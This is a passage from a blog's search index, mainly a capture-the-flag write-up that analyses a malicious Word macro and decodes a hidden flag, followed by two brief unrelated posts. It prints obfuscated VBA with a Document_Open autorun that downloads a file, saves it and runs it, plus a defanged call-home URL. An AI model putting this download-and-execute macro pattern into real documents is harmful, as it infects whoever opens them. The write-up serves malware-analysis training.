QklkhFEQNB(Array(42, 115, 2), 188)</div><div class="line">	Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))</div><div class="line">	Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))</div><div class="line">	xHttp.Open UkIWIEtqCF, twOvwCSTPL, False</div><div class="line">	xHttp.Send</div><div class="line">	With bStrm</div><div class="line">		.Type = 1</div><div class="line">		.Open</div><div class="line">		.write xHttp.responseBody</div><div class="line">		.savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2</div><div class="line">	End With</div><div class="line">	Shell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))</div><div class="line">End Function</div><div class="line"></div><div class="line">Private Sub Document_Open()</div><div class="line">	If ActiveDocument.Variables(&quot;ppKzr&quot;).Value &lt;&gt; &quot;toto&quot; Then</div><div class="line">		BkAIuNwQNDkohBY</div><div class="line">		ActiveDocument.Variables(&quot;ppKzr&quot;).Value = &quot;toto&quot;</div><div class="line">		If ActiveDocument.ReadOnly = False Then</div><div class="line">			ActiveDocument.Save</div><div class="line">		End If</div><div class="line">	End If</div><div class="line">End Sub</div></pre></td></tr></table></figure></p>
<p>Looking at this code I can see a couple of things that stand out:</p>
<ol>
<li>the QklkhFEQNB function is the string deobfuscation function. You can tell this by its frequency of use and its always called before the string is needed (look for CreateObject)</li>
<li>it does have an autorun functionality (i.e. “Document_Open”), so if we had opened the file and ran the macros it would have done its business</li>
</ol>
<p>What is its business, well without too much digging we can see that it has a variable named xHttp and xStrm in the BkAIuNwQNDkohBY function and we can see that there is a Shell command. Often variable names are also obfuscated in malicious documents so the fact that they aren’t kind of stands out. So it downloads something, saves it to disk, and executes it.</p>
<p>So first things first we want to see to where it calls home. To accomplish this we have the deobfuscation function in VBA, so lets open M$Word, create a new document, open up the VBA Editor and drop it in. </p>
<p>If you do this you will see that it won’t quite work that simply. If you look carefully at the deobfuscation function you’ll notice it references a document variable:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ActiveDocument.Variables(&quot;ppKzr&quot;).Value()</div></pre></td></tr></table></figure></p>
<p>and in the Document_Open subroutine it references this same variable and sets it to “toto”. Knee-jerk reaction replace that with the static string “toto”….nope won’t work, remember the way the code is written it must NOT be “toto” at first. So we have a couple of options at this point:</p>
<ol>
<li>We can brute force the value for the “ppKzr” variable</li>
<li>We can try to look up the value</li>
<li>We can just run it though a sandbox, or something monitoring the network traffic involved</li>
</ol>
<p>At this point I honestly went with option #3 (but we’ll come back to the other two options in other documents in this CTF track)…it was easy and quick.</p>
<p>In the end we have this URL that it tries to call home to (defanged):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hXXp://&#123;REDACTED RFC1918 IPv4&#125;/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.executes</div></pre></td></tr></table></figure></p>
<p>well that IP doesn’t help us, its a <a href="https://www.rfc-editor.org/rfc/rfc1918.txt" target="_blank" rel="external">RFC1918</a> (or via <a href="https://en.wikipedia.org/wiki/Private_network" target="_blank" rel="external">Wikipedia</a>) private block…but hmmm, that blob in the middle looks base64 encoded…and it even says “b64” but it also has a 0x58 before the blob…we’ll come back to that. So you run the “MDgx…jU=” string through your base64 decoder of choice (I used powershell):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$s1 = &quot;MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=&quot;</div><div class="line">[Convert]::FromBase64String($s1)</div></pre></td></tr></table></figure>
<p>You run the above and you’ll get an error immediate error:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Exception calling &quot;FromBase64String&quot; with &quot;1&quot; argument(s): &quot;The input is not a valid Base-64 string as it contains a non-base 64</div><div class="line">character, more than two padding characters, or an illegal character among the padding characters. &quot;</div></pre></td></tr></table></figure></p>
<p>Not a valid base64 string?? hmmm…lets look at that string again…wait there’s a “\n” in that string….ok so we can either take it out or make sure powershell properly escapes it…just change “\n” to “`n” as this is how powershell escapes stuff. So we run it through the base64 decoding function again and it works…but its just a bunch of bytes…but wait there all in a small range. Taking a guess that its an ASCII string I’ll run this powershell command:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s1))</div></pre></td></tr></table></figure></p>
<p>boom and I get a string (shortened for brevity):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">081916230e3102313a696b07683634216...68071336682f072f306b2a6b6a3468683325</div></pre></td></tr></table></figure></p>
<p>well that isn’t very interesting, but I think I’m stil on the right track. Now I need to go back to the 0x58…hmmm…I wonder if this an XOR string and perhaps the 0x58 is the key. How would I check this? I’ll turn to another tool <a href="http://www.kahusecurity.com/tools/" target="_blank" rel="external">DataConverter</a> by Kahu Security (of course there are other tools…)</p>
<p>So I put our string in and mark it as Hex format (looks hex to me), and enter our hex key 0x58 and we get (key is REDACTED for you pleasure):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PAN&#123;_REDACTED_&#125;</div></pre></td></tr></table></figure></p>
<p>huh…PAN{<em>blahblahblah</em>} that looks like the key we entered to get this started…lets try it out…</p>
<p>POOF</p>
<p>…it works and we get doc02</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Stuff and things yet to do]]></title>
      <url>https://dbheise.github.io/2016/08/13/Stuff-and-things-yet-to-do/</url>
      <content type="html"><![CDATA[<p>so one of the things this blog is going to try to accomplish is collect all the various items that I’ve put on various places in the web. This means old school projects/papers/writings/thoughts as well as linking to &amp; copying of content that I’ve produced that lives elsewhere on the web.</p>
<p>We’ll see how it goes…</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[first]]></title>
      <url>https://dbheise.github.io/2016/08/13/first/</url>
      <content type="html"><![CDATA[<p>so i’m trying to start to blog again…not because I want to talk, but because I want one consistant place to put everything…</p>
<p>we’ll see how it goes!</p>
]]></content>
    </entry>
    
  
  
</search>
